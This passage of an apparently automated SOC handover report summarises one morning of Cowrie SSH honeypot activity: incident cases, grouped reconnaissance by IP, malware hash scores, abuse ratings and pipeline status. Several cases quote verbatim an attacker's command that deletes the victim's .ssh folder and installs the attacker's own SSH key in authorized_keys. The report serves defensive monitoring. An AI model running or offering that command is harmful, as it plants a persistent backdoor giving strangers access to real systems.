| **Source IP** | `103.158.29[.]100` |
| **First Seen** | 2026-05-13 09:17 |
| **Last Seen** | 2026-05-13 09:18 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-13 09:17:57` | `cowrie.session.connect` |
| `2026-05-13 09:17:57` | `cowrie.client.version` |
| `2026-05-13 09:17:57` | `cowrie.client.kex` |
| `2026-05-13 09:17:58` | `cowrie.login.success` |
| `2026-05-13 09:17:58` | `cowrie.session.params` |
| `2026-05-13 09:17:58` | `cowrie.command.input` |
| `2026-05-13 09:17:58` | `cowrie.command.failed` |
| `2026-05-13 09:17:58` | `cowrie.log.closed` |
| `2026-05-13 09:17:59` | `cowrie.session.params` |
| `2026-05-13 09:17:59` | `cowrie.command.input` |
| `2026-05-13 09:17:59` | `cowrie.session.file_download` |
| `2026-05-13 09:17:59` | `cowrie.log.closed` |
| `2026-05-13 09:18:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.158.29[.]100` to AbuseIPDB if not already reported
- [ ] Block `103.158.29[.]100` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-945da9184adc

| Field | Detail |
|---|---|
| **Source IP** | `103.158.29[.]100` |
| **First Seen** | 2026-05-13 09:18 |
| **Last Seen** | 2026-05-13 09:18 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-13 09:18:01` | `cowrie.session.connect` |
| `2026-05-13 09:18:01` | `cowrie.client.version` |
| `2026-05-13 09:18:01` | `cowrie.client.kex` |
| `2026-05-13 09:18:01` | `cowrie.login.success` |
| `2026-05-13 09:18:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.158.29[.]100` to AbuseIPDB if not already reported
- [ ] Block `103.158.29[.]100` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8ef79a42a508

| Field | Detail |
|---|---|
| **Source IP** | `103.158.29[.]100` |
| **First Seen** | 2026-05-13 09:23 |
| **Last Seen** | 2026-05-13 09:23 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-13 09:23:29` | `cowrie.session.connect` |
| `2026-05-13 09:23:29` | `cowrie.client.version` |
| `2026-05-13 09:23:29` | `cowrie.client.kex` |
| `2026-05-13 09:23:29` | `cowrie.login.success` |
| `2026-05-13 09:23:30` | `cowrie.session.params` |
| `2026-05-13 09:23:30` | `cowrie.command.input` |
| `2026-05-13 09:23:30` | `cowrie.command.failed` |
| `2026-05-13 09:23:30` | `cowrie.log.closed` |
| `2026-05-13 09:23:30` | `cowrie.session.params` |
| `2026-05-13 09:23:30` | `cowrie.command.input` |
| `2026-05-13 09:23:30` | `cowrie.session.file_download` |
| `2026-05-13 09:23:30` | `cowrie.log.closed` |
| `2026-05-13 09:23:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.158.29[.]100` to AbuseIPDB if not already reported
- [ ] Block `103.158.29[.]100` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-71371623a41d

| Field | Detail |
|---|---|
| **Source IP** | `103.158.29[.]100` |
| **First Seen** | 2026-05-13 09:23 |
| **Last Seen** | 2026-05-13 09:23 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-13 09:23:32` | `cowrie.session.connect` |
| `2026-05-13 09:23:32` | `cowrie.client.version` |
| `2026-05-13 09:23:32` | `cowrie.client.kex` |
| `2026-05-13 09:23:33` | `cowrie.login.success` |
| `2026-05-13 09:23:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.158.29[.]100` to AbuseIPDB if not already reported
- [ ] Block `103.158.29[.]100` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9bc124e266e4

| Field | Detail |
|---|---|
| **Source IP** | `211.178.247[.]182` |
| **First Seen** | 2026-05-13 10:12 |
| **Last Seen** | 2026-05-13 10:12 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-13 10:12:06` | `cowrie.session.connect` |
| `2026-05-13 10:12:06` | `cowrie.client.version` |
| `2026-05-13 10:12:06` | `cowrie.client.kex` |
| `2026-05-13 10:12:07` | `cowrie.login.success` |
| `2026-05-13 10:12:07` | `cowrie.session.params` |
| `2026-05-13 10:12:07` | `cowrie.command.input` |
| `2026-05-13 10:12:07` | `cowrie.command.failed` |
| `2026-05-13 10:12:07` | `cowrie.log.closed` |
| `2026-05-13 10:12:07` | `cowrie.session.params` |
| `2026-05-13 10:12:07` | `cowrie.command.input` |
| `2026-05-13 10:12:08` | `cowrie.session.file_download` |
| `2026-05-13 10:12:08` | `cowrie.log.closed` |
| `2026-05-13 10:12:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `211.178.247[.]182` to AbuseIPDB if not already reported
- [ ] Block `211.178.247[.]182` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b531c95d6ba4

| Field | Detail |
|---|---|
| **Source IP** | `211.178.247[.]182` |
| **First Seen** | 2026-05-13 10:12 |
| **Last Seen** | 2026-05-13 10:12 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-13 10:12:10` | `cowrie.session.connect` |
| `2026-05-13 10:12:10` | `cowrie.client.version` |
| `2026-05-13 10:12:10` | `cowrie.client.kex` |
| `2026-05-13 10:12:10` | `cowrie.login.success` |
| `2026-05-13 10:12:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `211.178.247[.]182` to AbuseIPDB if not already reported
- [ ] Block `211.178.247[.]182` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6ee710625993

| Field | Detail |
|---|---|
| **Source IP** | `112.151.178[.]49` |
| **First Seen** | 2026-05-13 10:19 |
| **Last Seen** | 2026-05-13 10:19 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-13 10:19:33` | `cowrie.session.connect` |
| `2026-05-13 10:19:33` | `cowrie.client.version` |
| `2026-05-13 10:19:33` | `cowrie.client.kex` |
| `2026-05-13 10:19:33` | `cowrie.login.success` |
| `2026-05-13 10:19:34` | `cowrie.session.params` |
| `2026-05-13 10:19:34` | `cowrie.command.input` |
| `2026-05-13 10:19:34` | `cowrie.command.failed` |
| `2026-05-13 10:19:34` | `cowrie.log.closed` |
| `2026-05-13 10:19:34` | `cowrie.session.params` |
| `2026-05-13 10:19:34` | `cowrie.command.input` |
| `2026-05-13 10:19:34` | `cowrie.session.file_download` |
| `2026-05-13 10:19:34` | `cowrie.log.closed` |
| `2026-05-13 10:19:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.151.178[.]49` to AbuseIPDB if not already reported
- [ ] Block `112.151.178[.]49` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d217cbc7d5af

| Field | Detail |
|---|---|
| **Source IP** | `112.151.178[.]49` |
| **First Seen** | 2026-05-13 10:19 |
| **Last Seen** | 2026-05-13 10:19 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-13 10:19:36` | `cowrie.session.connect` |
| `2026-05-13 10:19:36` | `cowrie.client.version` |
| `2026-05-13 10:19:36` | `cowrie.client.kex` |
| `2026-05-13 10:19:37` | `cowrie.login.success` |
| `2026-05-13 10:19:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.151.178[.]49` to AbuseIPDB if not already reported
- [ ] Block `112.151.178[.]49` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `23.94.77[.]145` | **116** | 2026-05-13 06:50 | 2026-05-13 10:31 | 71m | 0 | `T1592` | 🟠 MEDIUM |
| `83.168.69[.]215` | **24** | 2026-05-13 08:05 | 2026-05-13 08:13 | 2m | 23 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `103.158.29[.]100` | **20** | 2026-05-13 08:45 | 2026-05-13 09:29 | 0m | 20 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `221.163.5[.]228` | **20** | 2026-05-13 08:02 | 2026-05-13 08:38 | 0m | 20 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `116.123.150[.]231` | **6** | 2026-05-13 08:50 | 2026-05-13 09:03 | 0m | 6 | `T1110.001 · T1592` | 🟢 LOW |
| `193.32.162[.]225` | **6** | 2026-05-13 09:31 | 2026-05-13 09:32 | 0m | 5 | `T1110.001` | 🟢 LOW |
| `221.202.188[.]169` | **4** | 2026-05-13 07:11 | 2026-05-13 07:19 | 8m | 0 | `T1592` | 🟢 LOW |
| `95.219.223[.]162` | **4** | 2026-05-13 07:06 | 2026-05-13 07:08 | 6m | 0 | `T1592` | 🟢 LOW |
| `103.49.238[.]35` | **3** | 2026-05-13 06:53 | 2026-05-13 06:59 | 0m | 3 | `T1110.001 · T1592` | 🟢 LOW |
| `42.51.42[.]209` | **3** | 2026-05-13 10:08 | 2026-05-13 10:08 | 2m | 0 | `T1592` | 🟢 LOW |
| `106.13.142[.]171` | **2** | 2026-05-13 09:07 | 2026-05-13 09:09 | 3m | 0 | `T1592` | 🟢 LOW |
| `109.105.211[.]11` | **2** | 2026-05-13 10:25 | 2026-05-13 10:26 | 0m | 0 | `T1592` | 🟢 LOW |
| `20.121.46[.]95` | **2** | 2026-05-13 09:07 | 2026-05-13 09:07 | 0m | 0 | `T1592` | 🟢 LOW |
| `205.185.121[.]144` | **2** | 2026-05-13 06:57 | 2026-05-13 08:39 | 1m | 0 | `T1592` | 🟢 LOW |
| `90.26.212[.]232` | **2** | 2026-05-13 09:27 | 2026-05-13 09:29 | 4m | 0 | `T1592` | 🟢 LOW |
| `109.105.211[.]15` | 1 | 2026-05-13 10:25 | 2026-05-13 10:25 | 0s | 0 | `T1592` | 🟢 LOW |
| `109.172.55[.]64` | 1 | 2026-05-13 09:10 | 2026-05-13 09:11 | 60s | 1 | `T1110.001` | 🟢 LOW |
| `112.151.178[.]49` | 1 | 2026-05-13 10:19 | 2026-05-13 10:19 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `115.190.142[.]147` | 1 | 2026-05-13 10:25 | 2026-05-13 10:27 | 120s | 0 | `T1592` | 🟢 LOW |
| `116.255.226[.]73` | 1 | 2026-05-13 08:31 | 2026-05-13 08:31 | 0s | 0 | `T1592` | 🟢 LOW |
| `124.156.202[.]242` | 1 | 2026-05-13 09:11 | 2026-05-13 09:11 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `138.197.164[.]175` | 1 | 2026-05-13 07:53 | 2026-05-13 07:53 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `151.40.205[.]12` | 1 | 2026-05-13 09:46 | 2026-05-13 09:47 | 14s | 0 | `T1592` | 🟢 LOW |
| `172.104.93[.]159` | 1 | 2026-05-13 07:21 | 2026-05-13 07:21 | 10s | 0 | `T1592` | 🟢 LOW |
| `181.52.238[.]13` | 1 | 2026-05-13 08:52 | 2026-05-13 08:52 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `188.6.165[.]90` | 1 | 2026-05-13 09:13 | 2026-05-13 09:15 | 120s | 0 | `T1592` | 🟢 LOW |
| `189.113.38[.]56` | 1 | 2026-05-13 08:01 | 2026-05-13 08:01 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `190.181.4[.]12` | 1 | 2026-05-13 09:15 | 2026-05-13 09:15 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `195.184.76[.]185` | 1 | 2026-05-13 10:28 | 2026-05-13 10:28 | 1s | 0 | `T1592` | 🟢 LOW |
| `195.184.76[.]55` | 1 | 2026-05-13 10:28 | 2026-05-13 10:28 | 1s | 0 | `T1592` | 🟢 LOW |
| `211.178.247[.]182` | 1 | 2026-05-13 10:12 | 2026-05-13 10:12 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `220.177.133[.]191` | 1 | 2026-05-13 09:49 | 2026-05-13 09:49 | 0s | 0 | `T1592` | 🟢 LOW |
| `223.17.5[.]126` | 1 | 2026-05-13 07:59 | 2026-05-13 07:59 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `45.148.120[.]187` | 1 | 2026-05-13 09:15 | 2026-05-13 09:17 | 78s | 0 | `T1592` | 🟢 LOW |
| `45.91.64[.]6` | 1 | 2026-05-13 09:54 | 2026-05-13 09:54 | 0s | 0 | `T1592` | 🟢 LOW |
| `5.182.83[.]231` | 1 | 2026-05-13 08:03 | 2026-05-13 08:03 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `51.178.114[.]78` | 1 | 2026-05-13 07:56 | 2026-05-13 07:56 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `62.89.22[.]163` | 1 | 2026-05-13 07:10 | 2026-05-13 07:12 | 120s | 0 | `T1592` | 🟢 LOW |
| `64.227.99[.]138` | 1 | 2026-05-13 09:12 | 2026-05-13 09:12 | 2s | 0 | `T1592` | 🟢 LOW |
| `80.102.218[.]187` | 1 | 2026-05-13 08:01 | 2026-05-13 08:01 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `91.230.168[.]16` | 1 | 2026-05-13 10:14 | 2026-05-13 10:14 | 10s | 0 | `T1592` | 🟢 LOW |
| `91.230.168[.]18` | 1 | 2026-05-13 10:15 | 2026-05-13 10:15 | 0s | 0 | `T1592` | 🟢 LOW |
| `91.230.168[.]20` | 1 | 2026-05-13 10:14 | 2026-05-13 10:14 | 0s | 0 | `T1592` | 🟢 LOW |
| `91.230.168[.]28` | 1 | 2026-05-13 10:15 | 2026-05-13 10:15 | 3s | 0 | `T1592` | 🟢 LOW |
| `95.84.146[.]9` | 1 | 2026-05-13 09:44 | 2026-05-13 09:44 | 30s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (28 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `20260429-011658-3f1992b60e9d-0-redir__root_a6s87d6as8zdgtdyas_ini` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260430-003018-0cc07f4bf950-0-redir__dev_watchdog` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `2495e33392ef58d29cef5077b77c6c9164ad3f4cfb2c433b344df7e674542664` | Unknown binary | `2495e33392ef58d2...` | 0/100 | 🟢 LOW | Not in VT |
| `2b78990584d601289f89026783af9871061dc18c4e52a49d0b4caad6a7d3143a` | ELF Binary (Linux executable) (MIPS 32-bit) | `2b78990584d60128...` | 30/100 | 🟢 LOW | Not in VT |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `6b3a55e0261b0304143f805a24924d0c1c44524821305f31d9277843b8a10f4e` | Unknown binary | `6b3a55e0261b0304...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 41/100 | 🟡 MEDIUM | **28/75** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `9a45029b646e2d20015695b5541f5fb76eace740bf329dc05af8ea53bd89619c` | Unknown binary | `9a45029b646e2d20...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 11/100 | 🟢 LOW | **29/75** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `95.84.146[.]9` | RU | PJSC Rostelecom | **100** ⚠️ | 12 |
| `195.184.76[.]55` | US | FR ONYPHE | **100** ⚠️ | 28 |
| `64.227.99[.]138` | US | DigitalOcean, LLC | **100** ⚠️ | 45 |
| `172.104.93[.]159` | JP | Linode | **100** ⚠️ | 50 |
| `62.89.22[.]163` | AM | GNC-Alfa CJSC | **100** ⚠️ | 2 |
| `193.32.162[.]225` | RO | UNMANAGED LTD | **100** ⚠️ | 0 |
| `221.202.188[.]169` | CN | China Unicom Liaoning Province Network | **100** ⚠️ | 23 |
| `91.230.168[.]20` | US | FR ONYPHE | **100** ⚠️ | 50 |
| `109.105.211[.]11` | US | ICG-ZEN-LAX-2 | **100** ⚠️ | 18 |
| `116.255.226[.]73` | CN | Zhengzhou Gainet Computer Network Technology Co.,Ltd. | **100** ⚠️ | 16 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 163 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 90 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 68 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 31 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 31 |

---

## 🔕 False Positive Summary (64 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 49 |
| AbuseIPDB score 23 below threshold 25 | 1 |
| AbuseIPDB score 4 below threshold 25 | 1 |
| AbuseIPDB score 5 below threshold 25 | 6 |
| AbuseIPDB score 7 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 6 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 378 cases |
| Tool 34  | Credential Extractor        | ✅ 158 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 11 fingerprints |
| Tool 36  | Command Clustering          | ✅ 4 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 54 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 64 filtered (16.9%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 43 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 28 files |
| Tool 33  | YARA Classifier             | ✅ 8 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 68 priority case(s) shown individually · 45 recon entry/entries in table (15 group(s) consolidating 216 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-05-13T10:33:30Z_
